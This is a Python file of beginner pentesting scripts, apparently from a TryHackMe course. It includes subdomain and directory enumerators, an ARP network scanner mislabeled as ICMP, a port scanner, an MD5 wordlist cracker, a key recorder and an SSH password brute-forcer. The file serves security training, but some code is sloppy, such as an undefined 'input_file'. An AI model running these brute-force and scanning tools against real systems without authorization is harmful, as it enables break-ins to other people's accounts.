#The script will use a list of potential subdomains and prepends them to the domain name provided via a command-line argument.
#The script then tries to connect to the subdomains and assumes the ones that accept the connection exist.

import requests
import sys

from scapy.layers.l2 import Ether, ARP

sub_list = open("subdomains.txt").read()
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}"

    try:
        requests.get(sub_domains)

    except requests.ConnectionError:
        pass

    else:
        print("Valid domain: ", sub_domains)

#---------------------------------------------------------------------------------------------
#The following code will build a simple directory enumeration tool.

import requests
import sys

sub_list = open("wordlist.txt").read()
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html"
    r = requests.get(dir_enum)
    if r.status_code==404:
        pass
    else:
        print("Valid directory:" ,dir_enum)

#simple ICMP (Internet Control Message Protocol) scanner

from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range)

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))

#---------------------------------------------------------------------------------------
#Simple Port Scanner

import sys
import socket
import pyfiglet

#To remove the Banner delete this section
ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)

#Specify the target or use ip = socket.gethostbyname(host)
ip = '192.168.1.6'
#empty open_ports array that will be populated later with the detected open ports
open_ports = []

#ports to be probed (Scans all TCP ports - to scan specific ports.-> ports = { 21, 22, 23, 53, 80, 135, 443, 445}
ports = range(1, 65535)


#Attempts to connect to the port
def probe_port(ip, port, result=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        r = sock.connect_ex((ip, port))
        if r == 0:
            result = r
        sock.close()
    except Exception as e:
        pass
    return result

#iterates through the specified port list
for port in ports:
    sys.stdout.flush()
    response = probe_port(ip, port)
    if response == 0:
        open_ports.append(port)

if open_ports:
    print("Open Ports are: ")
    print(sorted(open_ports))
else:
    print("Looks like no ports are open :(")

#-------------------------------------------------------------------------------------------
#Python tool to download files (similar to wget for Linux)
import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)

#adapted for other types of file downloads
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)


#------------------------------------------------------------------------------------------------
#Hash Cracker script (MD5 Algorithm)
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

#wordlist  of possible cleartext values
wordlist_location = str(input('Enter wordlist file location: '))
#hash you want to crack
hash_input = str(input('Enter hash to be cracked: '))

#reads values (1/line) from wordlist and converts cleartext values to hash values of chosen algorithm
with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
#compares generated hash value w/ user provided value
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)


#-----------------------------------------------------------------------------------------------------
#Keyboard logger script
import keyboard
#records keys pressed until the enter key is pressed
keys = keyboard.record(until ='ENTER')
#plays back keys pressed (edits using backspace will also be seen)
keyboard.play(keys)


#------------------------------------------------------------------------------------------
#One Way to build am SSH Brute Force Attack script
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

#SSH Connection: This section will create the "ssh_connect" function. Successful authentication will return a code 0, a failed authentication will return a code 1.
def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

#Password list: open the password file supplied by the user and uses each line as a password to be tried.
with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()

#The script tries to connect to the SSH server and decides on an output based on the response code (generated by Paramiko).
#Script exits once it has found a valid password
        try:
            response = ssh_connect(password)

            if response == 0:
                print('password found: ' + password)
                exit(0)
            elif response == 1:
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()